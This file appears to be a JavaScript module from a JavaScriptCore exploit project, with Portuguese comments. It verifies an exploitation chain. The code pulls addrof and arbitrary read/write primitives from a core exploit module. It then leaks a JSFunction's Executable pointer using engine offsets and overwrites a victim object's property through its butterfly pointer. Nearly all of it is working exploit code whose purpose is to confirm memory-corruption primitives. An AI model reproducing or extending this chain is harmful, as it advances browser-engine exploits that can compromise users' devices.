// js/script3/testArrayBufferVictimCrash.mjs (v103 - Verificação de Primitivas Completas)

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
import { setupAndGetRobustPrimitives } from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_UPDATED = "FullChainVerifier_v103";

/**
 * Testa a cadeia de exploração completa, incluindo o addrof estável e a L/E robusta.
 */
export async function runFullChainVerification() {
    const FNAME_TEST = FNAME_MODULE_UPDATED;
    logS3(`--- Iniciando ${FNAME_TEST}: Verificação da Cadeia de Exploração Completa ---`, "test");

    let final_result = { success: false, message: "Falha ao obter primitivas." };

    try {
        // FASE 1: Obter as primitivas, incluindo addrof.
        logS3("--- FASE 1: Obtendo primitivas robustas (addrof, L/E)... ---", "subtest");
        const primitives = await setupAndGetRobustPrimitives();
        if (!primitives || !primitives.arb_read || !primitives.arb_write || !primitives.addrof) {
            throw new Error("O objeto de primitivas retornado é incompleto.");
        }
        const { arb_read, arb_write, addrof } = primitives;
        logS3("Primitivas de L/E e addrof robustas recebidas com sucesso.", "good");

        // FASE 2: Re-executar o Teste de Leitura de Estrutura de Função (deve passar agora)
        logS3("--- FASE 2: Testando 'addrof' e 'arb_read' em uma JSFunction... ---", "subtest");
        const functionForInspection = () => { let a = 1; return a; };
        const func_addr = addrof(functionForInspection);
        logS3(`Endereço de 'functionForInspection' obtido com addrof: ${func_addr.toString(true)}`, "leak");

        const executable_ptr_offset = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET, 0);
        const executable_addr = arb_read(func_addr.add(executable_ptr_offset));
        logS3(`>> Ponteiro para Executable lido do offset +0x18: ${executable_addr.toString(true)}`, "leak");

        if (executable_addr && !executable_addr.equals(new AdvancedInt64(0, 0))) {
            logS3("TESTE DE LEITURA SUCESSO: O ponteiro para Executable é válido.", "good");
        } else {
            throw new Error("Teste de Leitura de Função falhou. Ponteiro para Executable nulo.");
        }

        // FASE 3: Re-executar o Teste de Modificação de Objeto (deve passar agora)
        logS3("--- FASE 3: Testando 'addrof' e 'arb_write' em um objeto... ---", "subtest");
        const victimObject = { a: 12345.0, b: "constante" };
        logS3(`Objeto vítima ANTES da modificação: a = ${victimObject.a}`, "info");

        const victim_addr = addrof(victimObject);
        // A primeira propriedade (butterfly) está no offset BUTTERFLY_OFFSET
        const butterfly_addr = arb_read(victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
        const prop_a_addr = butterfly_addr; // Primeira propriedade no butterfly
        
        const newValue = 54321.0;
        let dv = new DataView(new ArrayBuffer(8));
        dv.setFloat64(0, newValue, true);
        const newValueInt64 = new AdvancedInt64(dv.getUint32(0, true), dv.getUint32(4, true));

        logS3(`Escrevendo novo valor em ${prop_a_addr.toString(true)}...`, "info");
        arb_write(prop_a_addr, newValueInt64);
        logS3(`>> Objeto vítima DEPOIS da modificação: a = ${victimObject.a}`, "leak");

        if (victimObject.a === newValue) {
            logS3("TESTE DE ESCRITA SUCESSO: A propriedade do objeto foi modificada com sucesso.", "vuln");
            final_result = { success: true, message: "Cadeia de exploração completa, com addrof e L/E estáveis, foi verificada com sucesso!" };
        } else {
            throw new Error("Teste de Escrita de Objeto falhou.");
        }

    } catch (e) {
        final_result.message = `Exceção na verificação da cadeia completa: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_TEST} Concluído ---`, "test");
    return final_result;
}
